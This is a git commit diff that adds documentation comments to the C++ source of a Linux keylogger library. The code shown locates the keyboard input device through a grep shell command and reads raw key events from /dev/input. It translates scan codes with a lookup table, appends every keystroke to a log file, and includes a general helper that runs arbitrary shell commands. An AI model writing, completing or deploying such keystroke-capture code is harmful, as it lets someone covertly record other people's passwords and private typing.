1b37b8bef509a8f3856b53c7ff46fcd66efa81b6
William Murphy <will.murphy1994@gmail.com>
2019-11-16 23:40:52 -0800

    Added comments

--- libs/keylogger/src/Keylogger.cpp
+++ libs/keylogger/src/Keylogger.cpp
@@ -5,7 +5,9 @@
 #include <unordered_map>
 #include <iostream>
 
-// TODO: Finish lookup table 
+/**
+ * Lookup table for keyboard scan codes.
+ */
 const static std::unordered_map<short, std::string> lookup_table = {
     {41, "`"},
     {2, "1"},
@@ -18,12 +20,21 @@ const static std::unordered_map<short, std::string> lookup_table = {
     {52, "."}, {53, "/"}, {29, "[ctrl]"}, {125, "[windows]"}, {56, "[alt]"}, {57, " "}, {100, "[alt]"}, {126, "[windows]"}, {97, "[ctrl]"}
 };
 
+/**
+ * Executes a shell command and returns the result.
+ * 
+ * Params:
+ *  cmd: The command to be executed.
+ * 
+ * Returns:
+ *  The standard output of the command.
+ */
+// TODO: Move this function into a separate file/class since it can be used for other things.
 std::string exec(const char* cmd) {
     std::array<char, 128> buffer;
     std::string result = "";
     // Creates a unique pointer that uses the pclose() function as a destructor
     std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
-    // error handling
     if (!pipe) {
         throw std::runtime_error("popen() failed!");
     }
@@ -33,16 +44,28 @@ std::string exec(const char* cmd) {
     return result;
 }
 
+/**
+ * Constructs a Keylogger object.
+ */
 Keylogger::Keylogger(std::string log_filename) {
     m_log_filename = log_filename;
     m_keyboard_path = get_keyboard_path();
     printf("Using %s as input device\n", m_keyboard_path.c_str());
+    // TODO: Use exceptions instead of if statements
     if ((m_keyboard_fd = open(m_keyboard_path.c_str(), O_RDONLY)) == -1) {
         perror("Invalid device link");
         exit(1);
     }
 }
 
+/**
+ * Starts the keylogging loop.
+ * 
+ * Params: None
+ * 
+ * Returns: None
+ */
+// TODO: Change return type to void if needed
 bool Keylogger::start_logging() {
     while (true) {
         read(m_keyboard_fd, &m_ev, sizeof(struct input_event));
@@ -52,6 +75,13 @@ bool Keylogger::start_logging() {
     }
 }
 
+/**
+ * Processes key input based on the lookup table and writes the keys to the log file.
+ * 
+ * Params: None
+ * 
+ * Returns: None
+ */
 void Keylogger::process_keys() {
     std::unique_ptr<FILE, decltype(&fclose)> logfile_ptr(fopen(m_log_filename.c_str(), "a+"), fclose);
     try {
@@ -61,11 +91,20 @@ void Keylogger::process_keys() {
     }
     
 }
+
+/**
+ * Gets a keyboard device path from /proc/bus/input/devices
+ * and makes it usable by the keylogger.
+ * 
+ * Params: None
+ * 
+ * Returns: The keyboard device path.
+ */
 std::string Keylogger::get_keyboard_path() {
     // TODO: find a better way to do this
     std::string device_name = exec("grep -A 4 ^N.*[kK]eyboard /proc/bus/input/devices | grep -o event[0-9]");
     device_name.insert(0, "/dev/input/");
-    device_name.erase(device_name.find('\n'));
+    device_name.erase(device_name.find('\n')); // just in case there's a newline character at the end
     return device_name;
 }
 
